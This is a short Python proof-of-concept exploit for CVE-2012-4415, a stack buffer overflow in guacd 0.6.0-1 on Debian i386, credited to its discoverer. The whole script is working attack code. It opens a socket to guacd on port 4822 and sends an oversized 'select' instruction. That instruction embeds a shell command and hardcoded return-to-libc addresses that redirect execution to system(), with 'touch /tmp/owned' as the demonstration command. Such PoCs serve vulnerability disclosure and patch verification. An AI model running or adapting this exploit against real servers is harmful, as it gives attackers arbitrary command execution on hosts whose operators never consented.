#!/usr/bin/python
# CVE-2012-4415: PoC for guacd buffer overflow vulnerability # # Copyright (c) 2012 Timo Juhani Lindfors <timo.lindfors@iki.fi> # # Allows arbitrary code execution on Debian i386 guacd 0.6.0-1 with # default configuration. Uses return-to-libc to bypass non-executable # stack.
#
import socket, struct
PROTOCOL_ADDRESS = 0xbf807e9f
SYSTEM_ADDRESS = 0xb76e7640
class GuacdPOC:
    def __init__(self, command):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.connect(('localhost', 4822))
        self.s("select")
        self.c(",")
        protocol = (command + "; " + "#" * 265)[:265]
        protocol += struct.pack("L", PROTOCOL_ADDRESS)
        protocol += struct.pack("L", SYSTEM_ADDRESS)
        self.s(protocol)
        self.c(";")
    def s(self, x):
        self.sock.send("%d.%s" % (len(x), x))
    def c(self, x):
        self.sock.send(x)
GuacdPOC("touch /tmp/owned")

